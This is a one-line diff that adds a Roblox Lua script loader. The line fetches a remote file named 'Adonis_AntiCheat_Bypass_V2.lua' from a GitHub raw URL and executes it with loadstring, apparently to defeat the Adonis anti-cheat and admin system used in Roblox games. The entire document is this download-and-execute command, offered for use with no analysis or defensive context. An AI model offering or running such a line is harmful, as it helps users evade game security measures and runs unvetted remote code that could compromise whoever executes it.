@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/C0RP0RATE/Oblivious/refs/heads/main/Adonis_AntiCheat_Bypass_V2.lua'))()
